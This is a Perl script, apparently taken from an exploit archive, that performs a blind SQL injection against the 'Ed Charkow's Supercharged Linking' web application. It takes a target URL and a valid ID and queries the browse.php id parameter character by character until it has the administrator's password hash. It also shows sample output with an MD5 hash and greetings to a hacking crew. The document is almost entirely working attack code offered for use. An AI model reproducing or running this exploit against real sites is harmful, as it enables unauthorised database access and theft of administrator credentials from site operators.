#!/usr/bin/perl

#==========================================================================================#
#                                                                                          #
# [o] Ed Charkow&#039;s Supercharged Linking Blind SQL Injection Exploit                        #
#      Software   : Ed Charkow&#039;s Supercharged Linking                                      #
#      Buy Script : http://www.infodepot3000.com/Scripts/content/supercharged_linking.html #
#      Author     : NoGe                                                                   #
#      Contact    : noge[dot]code[at]gmail[dot]com                                         #
#      Blog       : http://evilc0de.blogspot.com                                           #
#                                                                                          #
# [o] Usage                                                                                #
#      root@noge:~# perl link.pl                                                           #
#                                                                                          #
#      [x]============================================================[x]                  #
#       | Ed Charkows Supercharged Linking Blind SQL Injection Exploit |                   #
#       |              [F]ound by NoGe [C]oded by Vrs-hCk              |                   #
#      [x]============================================================[x]                  #
#                                                                                          #
#      [+] URL Path : www.target.com/[path]                                                #
#      [+] Valid ID : 1                                                                    #
#                                                                                          #
#      [!] Exploiting http://www.target.com/[path]/ ...                                    #
#                                                                                          #
#      [+] SELECT password FROM admin LIMIT 0,1 ...                                        #
#      [+] md5@password&gt; de9e3ae793d300ce7ee4742d4513cb06                                  #
#                                                                                          #
#      [!] Exploit completed.                                                              #
#                                                                                          #
#      root@noge:~#                                                                        #
#                                                                                          #
# [o] Greetz                                                                               #
#      MainHack BrotherHood [ http://mainhack.net ]                                        #
#      Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang aJe                                 #
#      H312Y yooogy mousekill }^-^{ loqsa zxvf martfella                                   #
#      skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke                                       #
#                                                                                          #
#==========================================================================================#

use HTTP::Request;
use LWP::UserAgent;

$cmsapp = &#039;crotz&#039;;
$vuln   = &#039;browse.php?id=&#039;;
$table  = &#039;admin&#039;;
$column = &#039;password&#039;;
$regexp = &quot;No links for this category could be found&quot;;
$maxlen = 32;

my $OS = &quot;$^O&quot;;
if ($OS eq &#039;MSWin32&#039;) { system(&quot;cls&quot;); } else { system(&quot;clear&quot;); }

printf &quot;\n
                              $cmsapp
 [x]============================================================[x]
  | Ed Charkows Supercharged Linking Blind SQL Injection Exploit |
  |              [F]ound by NoGe [C]oded by Vrs-hCk              |
 [x]============================================================[x]

\n&quot;;

print &quot;\n [+] URL Path : &quot;; chomp($web=&lt;STDIN&gt;);
print &quot; [+] Valid ID : &quot;; chomp($id=&lt;STDIN&gt;);

if ($web =~ /http:\/\// ) { $target = $web.&quot;/&quot;; } else { $target = &quot;http://&quot;.$web.&quot;/&quot;; }

print &quot;\n\n [!] Exploiting $target ...\n\n&quot;;
&amp;get_data;
print &quot;\n\n [!] Exploit completed.\n\n&quot;;

sub get_data() {
	print &quot; [+] SELECT $column FROM $table LIMIT 0,1 ...\n&quot;;
	syswrite(STDOUT, &quot; [+] md5\@password&gt; &quot;, 20);
	for (my $i=1; $i&lt;=$maxlen; $i++) {
		my $chr = 0;
		my $found = 0;
		my $char = 48;
		while (!$chr &amp;&amp; $char&lt;=57) {
			if(exploit($i,$char) !~ /$regexp/) {
				$chr = 1;
				$found = 1;
				syswrite(STDOUT,chr($char),1);
			} else { $found = 0; }
			$char++;
		}
		if(!$chr) {
			$char = 97;
			while(!$chr &amp;&amp; $char&lt;=122) {
				if(exploit($i,$char) !~ /$regexp/) {
					$chr = 1;
					$found = 1;
					syswrite(STDOUT,chr($char),1);
				} else { $found = 0; }
				$char++;
			}
		}
		if (!$found) {
			print &quot;\n\n [!] Exploit completed.\n\n&quot;;
			exit;
		}
	}
}

sub exploit() {
	my $limit = $_[0];
	my $chars = $_[1];
	my $blind = &#039;+and+substring((select+&#039;.$column.&#039;+from+&#039;.$table.&#039;+limit+0,1),&#039;.$limit.&#039;,1)=char(&#039;.$chars.&#039;)&#039;;
	my $inject = $target.$vuln.$id.$blind;
	my $content = get_content($inject);
	return $content;
}

sub get_content() {
	my $url = $_[0];
	my $req = HTTP::Request-&gt;new(GET =&gt; $url);
	my $ua  = LWP::UserAgent-&gt;new();
	$ua-&gt;timeout(5);
	my $res = $ua-&gt;request($req);
	if ($res-&gt;is_error){
		print &quot;\n\n [!] Error, &quot;.$res-&gt;status_line.&quot;.\n\n&quot;;
		exit;
	}
	return $res-&gt;content;
}


